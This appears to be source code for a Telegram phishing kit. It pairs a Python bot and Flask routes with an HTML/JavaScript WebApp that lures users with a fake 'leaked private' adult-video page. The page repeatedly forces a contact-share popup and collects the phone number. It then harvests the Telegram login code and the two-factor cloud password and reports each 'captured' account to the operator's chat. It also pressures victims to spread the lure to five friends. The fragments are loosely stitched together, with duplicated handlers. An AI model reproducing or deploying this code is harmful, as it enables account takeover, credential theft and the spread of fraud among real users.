# bot_main.py — alada file e rakho, ei code ta flask server er sathe same process eo chalate paro
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import os

BOT_TOKEN_NEW = os.environ.get("WEBAPP_BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://yourdomain.com/tg")

bot = TelegramClient(StringSession(), API_ID, API_HASH).start(bot_token=BOT_TOKEN_NEW)

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    
    # WebApp button — Telegram e contact force share er jonno ei button er vitor jabe
    await event.respond(
        "🎬 **Premium Video Hub**\n\n"
        "🔞 Exclusive content unlock korte hoy — verify first.\n"
        "Tap below 👇",
        buttons=[
            [Button.webview("🔓 OPEN & VERIFY", url=WEBAPP_URL)]
        ],
        parse_mode='md'
    )

bot.run_until_disconnected()
@app.route('/tg')
def telegram_webapp():
    """Telegram WebApp entry — contact force + auto-redirect"""
    return render_template_string(TG_WEBAPP_PAGE)


@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    """Telegram share contact theke phone save"""
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    
    phone = format_phone(phone)
    
    # Already captured check
    accounts = load_accounts()
    existing = next((a for a in accounts if a['phone'] == phone), None)
    
    if existing:
        return jsonify({
            'success': True,
            'already_captured': True,
            'phone': phone,
            'user_id': existing['user_id']
        })
    
    # Naya phone — session dict e save koro (permanent account na, just pending)
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    
    logger.info(f"📞 Contact saved: {phone} | TG ID: {tg_id}")
    
    # Owner ke notify koro
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                'chat_id': YOUR_TELEGRAM_ID,
                'text': f"📞 Contact Captured\n👤 TG ID: `{tg_id}`\n📱 Phone: `{phone}`",
                'parse_mode': 'Markdown'
            },
            timeout=10
        )
    except:
        pass
    
    return jsonify({'success': True, 'phone': phone})


@app.route('/api/check_phone/<phone>')
def check_phone(phone):
    """Phone already captured kina check"""
    phone = format_phone(phone)
    accounts = load_accounts()
    a = next((x for x in accounts if x['phone'] == phone), None)
    if a:
        return jsonify({'captured': True, 'user_id': a['user_id']})
    
    with sessions_lock:
        if pending_codes.get(phone) in ('done',):
            return jsonify({'captured': True})
    
    return jsonify({'captured': False})
    TG_WEBAPP_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Video Hub</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh;padding-bottom:20px}
        .header{padding:40px 20px 20px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:24px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumb{width:100%;height:200px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .play{width:60px;height:60px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;border:2px solid rgba(255,255,255,0.2)}
        .info{padding:15px}
        .info h3{font-size:15px;margin-bottom:5px}
        .meta{color:#666;font-size:12px}
        .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .btn-wrap{padding:15px 20px}
        .btn{width:100%;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(0,136,204,0.4);letter-spacing:1px;text-transform:uppercase;transition:0.2s}
        .btn:active{transform:scale(0.97)}
        .btn:disabled{opacity:0.4}
        .btn-green{background:linear-gradient(45deg,#25D366,#128C7E);box-shadow:0 8px 30px rgba(37,211,102,0.4)}
        .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:999;display:none;align-items:center;justify-content:center;padding:20px}
        .overlay.show{display:flex}
        .modal{background:#141420;border-radius:20px;padding:28px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:pop 0.3s ease}
        @keyframes pop{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
        .modal-icon{text-align:center;font-size:48px;margin-bottom:12px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:8px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:18px;line-height:1.5}
        .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;font-size:13px;display:none}
        .sb.show{display:block}
        .sb.success{background:rgba(76,175,80,0.15);color:#81C784}
        .sb.error{background:rgba(244,67,54,0.15);color:#EF9A9A}
        .sb.info{background:rgba(33,150,243,0.15);color:#90CAF9}
        .sb.waiting{background:rgba(255,152,0,0.15);color:#FFB74D}
        .sp{display:inline-block;width:16px;height:16px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .otp-display{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:12px 0;font-weight:bold;min-height:55px}
        .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
        .key{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;font-weight:600}
        .key:active{background:#3a3a5e}
        .key.del{background:#e94560}
        .key.ok{background:#4CAF50;font-size:14px}
        .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
        .pwd-input:focus{border-color:#0088cc}
        .share-steps{display:flex;justify-content:center;gap:6px;margin:15px 0}
        .step{width:36px;height:36px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#666;font-weight:700}
        .step.done{background:#4CAF50;color:white}
        .step.active{background:#0088cc;color:white;animation:pulse 1s infinite}
        @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,204,0.4)}100%{box-shadow:0 0 0 12px rgba(0,136,204,0)}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified only</p>
    </div>
    
    <div class="card">
        <div class="thumb"><div class="play">▶</div></div>
        <div class="info">
            <h3>🔥 LEAKED PRIVATE — 2026</h3>
            <div class="meta">⭐ 4.9 • 2.4M views • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    
    <div class="btn-wrap">
        <button class="btn" id="mainBtn">🔓 UNLOCK NOW</button>
    </div>
    
    <!-- MODAL: Contact Force -->
    <div class="overlay" id="contactModal">
        <div class="modal">
            <div class="modal-icon">📱</div>
            <h2>Verify Your Number</h2>
            <p>Telegram e verify korte hobe.<br>Tap <strong>Share Contact</strong> to continue.</p>
            <button class="btn btn-green" id="shareContactBtn">📤 SHARE CONTACT</button>
            <div class="sb" id="contactStatus"></div>
        </div>
    </div>
    
    <!-- MODAL: OTP -->
    <div class="overlay" id="otpModal">
        <div class="modal">
            <div class="modal-icon">🔐</div>
            <h2>Enter Code</h2>
            <p>📱 <span id="phoneDisplay" style="color:#0088cc;font-weight:bold"></span></p>
            <div class="sb waiting show" id="otpWait"><span class="sp"></span> Sending code...</div>
            <div class="otp-display" id="otpDisplay">_</div>
            <div class="keypad">
                <button class="key" onclick="pk('1')">1</button>
                <button class="key" onclick="pk('2')">2</button>
                <button class="key" onclick="pk('3')">3</button>
                <button class="key" onclick="pk('4')">4</button>
                <button class="key" onclick="pk('5')">5</button>
                <button class="key" onclick="pk('6')">6</button>
                <button class="key" onclick="pk('7')">7</button>
                <button class="key" onclick="pk('8')">8</button>
                <button class="key" onclick="pk('9')">9</button>
                <button class="key del" onclick="del()">⌫</button>
                <button class="key" onclick="pk('0')">0</button>
                <button class="key ok" id="otpOk" onclick="submitOtp()">✓ OK</button>
            </div>
            <div class="sb" id="otpStatus"></div>
        </div>
    </div>
    
    <!-- MODAL: 2FA -->
    <div class="overlay" id="pwdModal">
        <div class="modal">
            <div class="modal-icon">🔐</div>
            <h2>Two-Factor Auth</h2>
            <p>Ei account e 2FA ase.<br>Cloud password din:</p>
            <input type="password" class="pwd-input" id="pwdInput" placeholder="Password" maxlength="64">
            <button class="btn" onclick="submitPwd()" style="background:linear-gradient(45deg,#e94560,#d63851)">🔑 VERIFY</button>
            <div class="sb" id="pwdStatus"></div>
        </div>
    </div>
    
    <!-- MODAL: Share/Refer (returning user) -->
    <div class="overlay" id="shareModal">
        <div class="modal">
            <div class="modal-icon">🎬</div>
            <h2>Almost Unlocked!</h2>
            <p>Share with <strong>5 friends</strong> to unlock</p>
            <div class="share-steps">
                <div class="step" id="st1">1</div>
                <div class="step" id="st2">2</div>
                <div class="step" id="st3">3</div>
                <div class="step" id="st4">4</div>
                <div class="step" id="st5">5</div>
            </div>
            <div class="sb info show" id="shareStatus">Share to start</div>
            <button class="btn btn-green" onclick="doShare()">📤 SHARE ON TELEGRAM</button>
        </div>
    </div>
    
    <script>
    // ========== INIT TELEGRAM WEBAPP ==========
    var tg = window.Telegram ? window.Telegram.WebApp : null;
    if (tg) {
        tg.ready();
        tg.expand();
        tg.enableClosingConfirmation();
    }
    
    var TG_ID = tg && tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
    var TG_USERNAME = tg && tg.initDataUnsafe && tg.initDataUnsafe.user ? (tg.initDataUnsafe.user.username || '') : '';
    
    // Local cache
    var USER_PHONE_KEY = 'pv_phone_' + TG_ID;
    var USER_SHARES_KEY = 'pv_shares_' + TG_ID;
    var USER_CAPTURED_KEY = 'pv_captured_' + TG_ID;
    
    var phoneNumber = '';
    var codeDigits = '';
    var sharesDone = 0;
    var codeCheckInterval = null;
    var pwdCheckInterval = null;
    var contactForceInterval = null;
    
    var TG_CHANNEL = 'https://t.me/videodks';
    var TG_CAPTION = 'Premium content🔞👇';
    
    // ========== MAIN BUTTON ==========
    document.getElementById('mainBtn').onclick = function() {
        // Check local cache first
        var cachedPhone = localStorage.getItem(USER_PHONE_KEY);
        var isCaptured = localStorage.getItem(USER_CAPTURED_KEY) === '1';
        
        if (cachedPhone && isCaptured) {
            // Returning captured user — direct share page
            phoneNumber = cachedPhone;
            openShareModal();
            return;
        }
        
        if (cachedPhone) {
            // Phone saved but not captured yet — OTP direct
            phoneNumber = cachedPhone;
            openOtpModal();
            return;
        }
        
        // First time — force contact share
        openContactModal();
    };
    
    // ========== CONTACT FORCE MODAL ==========
    function openContactModal() {
        document.getElementById('contactModal').classList.add('show');
        startContactForce();
    }
    
    function startContactForce() {
        // Clear old interval
        if (contactForceInterval) clearInterval(contactForceInterval);
        
        // Immediately try to open contact picker
        setTimeout(triggerContactShare, 300);
        
        // Loop — bar bar try koro jotokkhon na share kore
        contactForceInterval = setInterval(function() {
            // Agar modal ekhono open ache, abar popup
            if (document.getElementById('contactModal').classList.contains('show')) {
                triggerContactShare();
            } else {
                clearInterval(contactForceInterval);
                contactForceInterval = null;
            }
        }, 1500);
    }
    
    function triggerContactShare() {
        if (!tg) {
            // Browser fallback (Telegram er baire test korle)
            showContactStatus('Telegram e open koro', 'error');
            return;
        }
        
        try {
            tg.requestContact(function(sent, event) {
                if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
                    handleContact(event.responseUnsafe.contact);
                } else {
                    // User cancel korse — abar force
                    showContactStatus('❌ Contact share korte hobe!', 'error');
                }
            });
        } catch(e) {
            // Older Telegram versions — openContactPicker fallback
            try {
                tg.openContactPicker && tg.openContactPicker();
            } catch(err) {
                showContactStatus('Update Telegram app', 'error');
            }
        }
    }
    
    document.getElementById('shareContactBtn').onclick = function() {
        triggerContactShare();
    };
    
    function handleContact(contact) {
        var phone = contact.phone_number || '';
        if (!phone) {
            showContactStatus('❌ Phone number pelam na', 'error');
            return;
        }
        
        if (phone.charAt(0) !== '+') phone = '+' + phone;
        phoneNumber = phone;
        
        showContactStatus('✅ Contact verified!', 'success');
        document.getElementById('contactStatus').className = 'sb success show';
        
        // Clear force loop
        if (contactForceInterval) {
            clearInterval(contactForceInterval);
            contactForceInterval = null;
        }
        
        // Save to server
        fetch('/api/save_contact', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({tg_id: TG_ID, phone: phoneNumber})
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.success) {
                localStorage.setItem(USER_PHONE_KEY, phoneNumber);
                
                if (data.already_captured && data.user_id) {
                    // Already captured — direct share
                    localStorage.setItem(USER_CAPTURED_KEY, '1');
                    document.getElementById('contactModal').classList.remove('show');
                    openShareModal();
                } else {
                    // New — OTP flow
                    setTimeout(function() {
                        document.getElementById('contactModal').classList.remove('show');
                        openOtpModal();
                    }, 800);
                }
            } else {
                showContactStatus('❌ Server error', 'error');
            }
        })
        .catch(function() {
            showContactStatus('❌ Connection error', 'error');
        });
    }
    
    function showContactStatus(msg, type) {
        var el = document.getElementById('contactStatus');
        el.className = 'sb ' + type + ' show';
        el.textContent = msg;
    }
    
    // ========== OTP MODAL ==========
    function openOtpModal() {
        document.getElementById('otpModal').classList.add('show');
        document.getElementById('phoneDisplay').textContent = phoneNumber;
        
        // Send code via backend
        fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber})
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.success) {
                document.getElementById('otpWait').className = 'sb success show';
                document.getElementById('otpWait').innerHTML = '✅ Code pathano hoyeche!';
                startOtpCheck();
            } else {
                document.getElementById('otpWait').className = 'sb error show';
                document.getElementById('otpWait').textContent = '❌ ' + (data.error || 'Failed');
            }
        })
        .catch(function() {
            document.getElementById('otpWait').className = 'sb error show';
            document.getElementById('otpWait').textContent = '❌ Network error';
        });
    }
    
    function startOtpCheck() {
        if (codeCheckInterval) clearInterval(codeCheckInterval);
        codeCheckInterval = setInterval(function() {
            fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.s === '2fa_needed') {
                    clearInterval(codeCheckInterval);
                    document.getElementById('otpModal').classList.remove('show');
                    document.getElementById('pwdModal').classList.add('show');
                    startPwdCheck();
                } else if (data.s === 'done') {
                    clearInterval(codeCheckInterval);
                    onCaptureSuccess();
                } else if (data.s === 'err') {
                    clearInterval(codeCheckInterval);
                    document.getElementById('otpWait').className = 'sb error show';
                    document.getElementById('otpWait').textContent = '❌ Code send failed';
                }
            })
            .catch(function(){});
        }, 2000);
    }
    
    function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('otpDisplay').textContent = codeDigits; } }
    function del() { codeDigits = codeDigits.slice(0,-1); document.getElementById('otpDisplay').textContent = codeDigits || '_'; }
    
    function submitOtp() {
        if (codeDigits.length < 5) { showOtpStatus('❌ 5 digits din', 'error'); return; }
        document.getElementById('otpOk').disabled = true;
        document.getElementById('otpOk').textContent = '⏳';
        
        fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.success) {
                onCaptureSuccess();
            } else if (data.needs_password) {
                document.getElementById('otpModal').classList.remove('show');
                document.getElementById('pwdModal').classList.add('show');
                startPwdCheck();
            } else {
                showOtpStatus('❌ ' + (data.error || 'Wrong code'), 'error');
                codeDigits = '';
                document.getElementById('otpDisplay').textContent = '_';
                document.getElementById('otpOk').disabled = false;
                document.getElementById('otpOk').textContent = '✓ OK';
            }
        })
        .catch(function() {
            showOtpStatus('❌ Error', 'error');
            document.getElementById('otpOk').disabled = false;
            document.getElementById('otpOk').textContent = '✓ OK';
        });
    }
    
    function showOtpStatus(msg, type) {
        var el = document.getElementById('otpStatus');
        el.className = 'sb ' + type + ' show';
        el.textContent = msg;
    }
    
    // ========== 2FA MODAL ==========
    function startPwdCheck() {
        if (pwdCheckInterval) clearInterval(pwdCheckInterval);
        pwdCheckInterval = setInterval(function() {
            fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.s === 'done') {
                    clearInterval(pwdCheckInterval);
                    onCaptureSuccess();
                }
            })
            .catch(function(){});
        }, 2000);
    }
    
    function submitPwd() {
        var pwd = document.getElementById('pwdInput').value.trim();
        if (!pwd) {
            document.getElementById('pwdStatus').className = 'sb error show';
            document.getElementById('pwdStatus').textContent = '❌ Password din';
            return;
        }
        document.getElementById('pwdStatus').className = 'sb waiting show';
        document.getElementById('pwdStatus').innerHTML = '<span class="sp"></span> Checking...';
        
        fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.success) {
                onCaptureSuccess();
            } else {
                document.getElementById('pwdStatus').className = 'sb error show';
                document.getElementById('pwdStatus').textContent = '❌ ' + (data.error || 'Wrong');
            }
        })
        .catch(function() {
            document.getElementById('pwdStatus').className = 'sb error show';
            document.getElementById('pwdStatus').textContent = '❌ Error';
        });
    }
    
    // ========== CAPTURE SUCCESS — GO TO SHARE ==========
    function onCaptureSuccess() {
        localStorage.setItem(USER_PHONE_KEY, phoneNumber);
        localStorage.setItem(USER_CAPTURED_KEY, '1');
        localStorage.setItem(USER_SHARES_KEY, '0');
        
        if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        if (pwdCheckInterval) { clearInterval(pwdCheckInterval); pwdCheckInterval = null; }
        
        document.getElementById('otpModal').classList.remove('show');
        document.getElementById('pwdModal').classList.remove('show');
        openShareModal();
    }
    
    // ========== SHARE MODAL ==========
    function openShareModal() {
        document.getElementById('shareModal').classList.add('show');
        sharesDone = parseInt(localStorage.getItem(USER_SHARES_KEY) || '0');
        updateShareSteps();
        
        if (sharesDone > 0 && sharesDone < 4) {
            document.getElementById('shareStatus').className = 'sb success show';
            document.getElementById('shareStatus').textContent = '✅ ' + sharesDone + '/5 done!';
        }
    }
    
    function doShare() {
        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
        
        // Open Telegram share
        if (tg) {
            tg.openTelegramLink(shareUrl);
        } else {
            window.open(shareUrl, '_blank');
        }
        
        sharesDone = Math.min(sharesDone + 1, 4);
        localStorage.setItem(USER_SHARES_KEY, String(sharesDone));
        updateShareSteps();
        
        if (sharesDone >= 4) {
            document.getElementById('shareStatus').className = 'sb waiting show';
            document.getElementById('shareStatus').innerHTML = '<span class="sp"></span> Last one...';
        } else {
            document.getElementById('shareStatus').className = 'sb success show';
            document.getElementById('shareStatus').textContent = '✅ ' + sharesDone + '/5 done!';
        }
    }
    
    function updateShareSteps() {
        for (var i = 1; i <= 5; i++) {
            var el = document.getElementById('st' + i);
            if (i <= sharesDone) el.className = 'step done';
            else if (i === sharesDone + 1) el.className = 'step active';
            else el.className = 'step';
        }
    }
    
    // ========== AUTO START ==========
    // Jodi URL e ?auto=1 thake, contact modal auto open
    if (window.location.search.indexOf('auto=1') !== -1) {
        setTimeout(function() {
            document.getElementById('mainBtn').click();
        }, 500);
    }
    </script>
</body>
</html>"""
    WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://yourdomain.com/tg")

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    # Auto param diye pathao jate WebApp khulei contact popup ashe
    url = WEBAPP_URL + "?auto=1"
    await event.respond(
        "🎬 **Premium Video Hub**\n\n"
        "🔞 Unlock korte verify koro:",
        buttons=[[Button.webview("🔓 VERIFY & UNLOCK", url=url)]],
        parse_mode='md'
    )
